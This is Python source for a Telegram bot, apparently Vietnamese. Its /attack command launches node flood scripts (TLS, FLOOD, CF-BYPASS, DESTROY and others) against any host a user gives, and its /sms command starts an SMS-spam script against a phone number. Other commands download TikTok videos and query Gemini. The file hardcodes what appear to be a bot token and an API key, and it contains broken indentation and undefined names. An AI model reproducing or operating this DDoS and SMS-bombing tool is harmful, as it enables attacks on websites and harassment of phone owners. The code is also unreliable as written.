import telegram 
#code này để chạy bot thêm tính năng là chạy phà phà
import telebot 
import time
import sys
import subprocess
import requests
import random
import os 
from datetime import datetime
from pyotp import TOTP
import psutil
import hashlib
import socket
import zipfile
import io
import re
import html
import string
import subprocess
import sqlite3
from gtts import gTTS
import urllib3
import json
import wget
from telebot import types
import google.generativeai as genai
urllib3.disable_warnings()

bot_token = '7212380435:AAESyeHsC-IIm-63cgL82V2W-rAcd2K-rfc'# nhập token bot

bot = telebot.TeleBot(bot_token)




# Khởi tạo một dictionary để lưu trữ các từ ngữ và câu trả lời tương ứng
keywords = {}


# Thời gian bot bắt đầu hoạt động
start_time = time.time()

# Biến toàn cục để lưu trữ tin nhắn sẽ được gửi tự động
auto_message = ''

filters = {}  # Lưu trữ bộ lọc

allowed_users = []
processes = []
admins = ["6895557861", "5789810284"] # Thay thế ADMIN_ID_1 và ADMIN_ID_2 bằng ID của các Admin
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

print("Bot Đã Được Khởi Chạy")
print("Ower : @Louisvinh")
print("LouisModTeam  - 𝗕𝗼𝘁⚡️")

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()
cooldown_dict = {}  # Thêm dòng này để khởi tạo cooldown_dict




# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()




@bot.message_handler(commands=['start'])
def diggory(message):
    username = message.from_user.username
    diggory_chat = f'''
┌──────────⭓VIP @Louisvinh
│» 🔔 Hello: @{username}
│»  🐸 𝐵𝑜𝑡 𝐵𝑦 顶级开发商│ ᴍʀ 𝐕𝐋𝐒\n│»🛌 /admin : 𝐼𝑛𝑓𝑜 𝐴𝑑𝑚𝑖𝑛.\n│»👾 /attack : Website Request Attack\n🍉 /methods : See List of Methods\n│»🥶 /tiktok : Download video tik\n│»💡 /ask : GPT AI Bot.\n│»🤖/time : check time\n│»🖥️/id : Scan Id\n│»🌐 Telegram : @Lousivinh
└─────────────────────
    '''
    sent_message = bot.send_message(message.chat.id, diggory_chat)

    time.sleep(50)




@bot.message_handler(commands=['sms'])
def sms(message):
    user_id = message.from_user.id
    

    if len(message.text.split()) != 3:
        bot.reply_text(message.chat_id, "<b>Vui Lòng Nhập Đúng Định Dạng.</b> <i>Ex: /sms 0900000000 5</i>", parse_mode='html')
        return

    phone_number = message.text.split()[1]
    spam_time = message.text.split()[2]

    if not phone_number.isdigit() or len(phone_number) != 10:
        bot.reply_text(message.chat_id, "Vui lòng nhập số điện thoại đúng định dạng 10 chữ số.")
        return

    if not spam_time.isdigit() or int(spam_time) > 49:
        bot.reply_text(message.chat_id, "Vui lòng nhập số phút (nhỏ hơn 50) sau lệnh [/sms].\nVí dụ: `/sms 0900000000 5`\n")
        return

    if phone_number in ['113', '114', '0376349783', '0333079921', '0974707985', '0915215448', '+84397333616', '+84915215448', '+84974707985', '0978551717', '116', '911']:
        # Số điện thoại nằm trong danh sách cấm
        bot.reply_text(message.chat_id, "Số này nằm trong danh sách cấm. Vui lòng nhập số khác.")
        return

    current_time = time.time()

    if phone_number in last_used_times:
        last_used_time = last_used_times[phone_number]
        if current_time - last_used_time < 300:
            # Thông báo cho người dùng rằng số đang trong quá trình tấn công, cần chờ thời gian
            remaining_time = int(300 - (current_time - last_used_time))
            bot.reply_text(message.chat_id, f"Number {phone_number} Đang Trong Quá Trình Tấn Công. Vui Lòng Chờ {remaining_time} Giây Mới Tấn Công Được Lần Hai.")
            return

    user_mention = message.from_user.mention_html()
    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    video_url = "https://files.catbox.moe/b75dvz.gif"
    hi_text = f'''
⚡️ 𝗬𝗼𝘂 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗲𝗻𝘁 ⚡️
  <b>❘ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻:</b>
   • 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝘆: {user_mention}
   • 𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: {phone_number}
   • 𝗧𝗶𝗺𝗲: {spam_time} 𝗠𝗶𝗻𝘂𝘁𝗲𝘀
   • 𝗣𝗹𝗮𝗻:  𝗙𝗿𝗲𝗲
  <b>❘ 𝗦𝘆𝘀𝘁𝗲𝗺 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:</b>
   • 𝗖𝗣𝗨 : {cpu_usage}%
   • 𝗗𝗜𝗦𝗞 : {disk_usage}%
   • 𝗠𝗘𝗠𝗢𝗥𝗬 : {memory_usage}%
'''

    bot.send_video(message.chat_id, video_url, caption=hi_text, parse_mode='html') 
    last_used_times[phone_number] = current_time

    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "100"])
    processes.append(process)





@bot.message_handler(commands=['time'])
def show_uptime(message):
	
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'```{hours} giờ, {minutes} phút, {seconds} giây```'
    
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')


@bot.message_handler(commands=['ask'])
def gpt(message):
  
  chat_id = message.chat.id
  genai.configure(api_key="AIzaSyBeOeuX-CxrJw0bohXfkMi9ogQurWDp66c")

  generation_config = {
    "temperature": 0.9,
    "top_p": 1,
    "top_k": 1,
    "max_output_tokens": 2048,
  }

  safety_settings = [
    {
      "category": "HARM_CATEGORY_HARASSMENT",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    },
    {
      "category": "HARM_CATEGORY_HATE_SPEECH",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    },
    {
      "category": "HARM_CATEGORY_SEXUALLY_EXPLICIT",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    },
    {
      "category": "HARM_CATEGORY_DANGEROUS_CONTENT",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    }
  ]

  model = genai.GenerativeModel(model_name="gemini-1.5-pro-latest",
                            generation_config=generation_config,
                              safety_settings=safety_settings)
  start_time = time.time()
  prompt_parts = message.text.split()[1:]
  prompt_parts = ' '.join(prompt_parts)

  response = model.generate_content(prompt_parts)
  end_time = time.time()
  response_time = end_time - start_time
  bot.reply_to(message, f"●━━━━━━━━━━━━━━━●\n`{response.text}`\n●━━━━━━━━━━━━━━━●\n status time:{response_time}\n●━━━━━━━━━━━━━━━●", parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
def diggory(message):
    video = random.choice(["https://files.catbox.moe/8rflr1.mp4", "https://files.catbox.moe/pk5y20.mp4", "https://files.catbox.moe/s5xsi4.mp4", "https://files.catbox.moe/ioafmk.mp4"])
    username = message.from_user.username
    diggory_chat = f'''
┌─────⭓ DEV ᴍʀ 𝐕𝐋𝐒ㅤ🧿 | BOT
│»  🔔 Xin Chào: @{username}
│»  🌐 Zalo: xxxx
│»  🌐 Telegram : @Louisvinh
└─────────────────────
    '''
    sent_message = bot.send_message(message.chat.id, diggory_chat)

    time.sleep(20)

#Tỉa soud
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"📄 • User ID : {user_id}")

@bot.message_handler(commands=['tiktok'])
def luuvideo_tiktok(message):
  if len(message.text.split()) == 1:
    sent_message = bot.reply_to(message, 'Please enter the tiktok video.\n For example: /tiktok https://tiktok.com/mau')
    return
  linktt = message.text.split()[1]
  data = f'url={linktt}'
  head = {
    "Host":"www.tikwm.com",
    "accept":"application/json, text/javascript, */*; q=0.01",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
  }
  response = requests.post("https://www.tikwm.com/api/",data=data,headers=head).json()
  linkz = response['data']['play']
  rq = response['data']
  tieude = rq['title']
  view = rq['play_count']
  sent_message = bot.reply_to(message, f'Please wait a moment..\n»Title: {tieude}\n»Video views: {view}')
  try:
   bot.send_video(message.chat.id, video=linkz, caption=f'Video downloaded successfully, thank you for using me\n»Title: {tieude}\n»Video View: {view}\n»Creator: t.me/Louisvinh', reply_to_message_id=message.message_id, supports_streaming=True)
  except Exception as e:
   bot.reply_to(message, f'The Video Is Too Heavy So You Can Download It Yourself Using The Link:\n{linkz}')
  bot.delete_message(chat_id=message.chat.id, message_id=sent_message.message_id)  
  


def is_user_admin(chat_id, user_id):
    """Kiểm tra xem người dùng có phải là admin của chat (nhóm) không."""
    admin_list = bot.get_chat_administrators(chat_id)
    for admin in admin_list:
        if admin.user.id == user_id:
            return True
    return False


@bot.message_handler(commands=['filters'])
def list_filters(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Chỉ cho phép admin xem bộ lọc
    if not is_user_admin(chat_id, user_id):
        bot.reply_to(message, "Xin lỗi, chỉ có admin mới có thể xem danh sách bộ lọc.")
        return
    
    if filters:
        filter_list = ', '.join(filters.keys())
        bot.reply_to(message, f"Danh sách bộ lọc hiện tại: {filter_list}")
    else:
        bot.reply_to(message, "Không có bộ lọc nào được cài đặt.")

# Các hàm xử lý khác đã được thêm vào từ các ví dụ trước...



@bot.message_handler(commands=['filter'])
def add_filter(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Chỉ cho phép admin thêm bộ lọc
    if not is_user_admin(chat_id, user_id):
        bot.reply_to(message, "Xin lỗi, bạn cần phải là admin để sử dụng lệnh này.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.reply_to(message, "Bạn cần chỉ định tên bộ lọc. Ví dụ: /filter vinh")
        return
    
    filter_name = parts[1].strip().lower()  # Để tránh phân biệt chữ hoa chữ thường
    filters[filter_name] = message.reply_to_message.text if message.reply_to_message else "Bộ lọc này không có nội dung mặc định."
    bot.reply_to(message, f"Đã thêm bộ lọc cho từ khóa: '{filter_name}'")


@bot.message_handler(commands=['stop'])
def remove_filter(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Chỉ cho phép admin xóa bộ lọc
    if not is_user_admin(chat_id, user_id):
        bot.reply_to(message, "Xin lỗi, chỉ có admin mới có thể thực hiện hành động này.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.reply_to(message, "Bạn cần chỉ định tên bộ lọc cần xóa. Ví dụ: /stop <từ khóa>")
        return
    
    filter_name = parts[1].strip().lower()
    
    if filter_name in filters:
        del filters[filter_name]
        bot.reply_to(message, f"Bộ lọc cho từ khóa '{filter_name}' đã được xóa.")
    else:
        bot.reply_to(message, f"Không tìm thấy bộ lọc cho từ khóa: '{filter_name}'")
        

@bot.message_handler(func=lambda message: True)
def filter_message(message):
    for filter_name in filters:
        if filter_name in message.text.lower():
            bot.reply_to(message, filters[filter_name])
            break
   
    

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please enter the correct syntax.\nFor example: `/attack` + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 10:
        remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please wait {remaining_time} seconds before using the command again `/attack`.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['TLS', 'FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
        return

    if method in ['TLS', 'FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "liem.com"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return
if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'FLOOD', 'BROWSER']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "90", "64", "5"]
            duration = 90
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "90", "64", "10"]
            duration = 45
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host,
                       "90", "64", "2", "proxy.txt"]
            duration = 90
        elif method == 'CF-BYPASS':
            command = ["node", "CF-BYPASS.js",
                       host, "90", "64", "1", "proxy.txt"]
         elif method == 'BYPASS':
            command = ["node", "BYPASS.js",
                       host, "90", "64", "1", "proxy.txt"]
        elif method == 'BROWSER':
            command = ["node", "BROWSER.js", host, "90", "50", "proxy.txt", "128", "90"]
            duration = 90
        elif method == 'FLOOD':
            command = ["node", "FLOOD.js", host, "90", "120", "50", "proxy.txt"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(
            target=run_attack, args=(command, duration, message))
        attack_thread.start()
        video_url = "https://files.catbox.moe/pk5y20.mp4"  # Replace this with the actual video URL      
        message_text =f'\n   Successful Attack \n\n\n➣ User👤: @{username} \n➣ Victim⚔️: {host} \n➣ Methods📁: {method} \n➣ Time⏰: [ {duration}s ]\n\n'
        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
        
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')



@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
𝐖𝐡𝐢𝐬 𝐌𝐞𝐭𝐡𝐨𝐝𝐬 𝐋𝐚𝐲𝐞𝐫 𝟕
𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : /attack + [𝒉𝒐𝒔𝒕] + [𝒑𝒐𝒓𝒕] + [𝒕𝒊𝒎𝒆] + [𝒎𝒆𝒕𝒉𝒐𝒅𝒔]
 - DESTROY
 - FLOOD
 - BYPASS
 - CF-BYPASS
 - TLS
 - GOD
 - BROWSER
'''
    bot.reply_to(message, help_text)



bot.infinity_polling(timeout=60, long_polling_timeout = 2)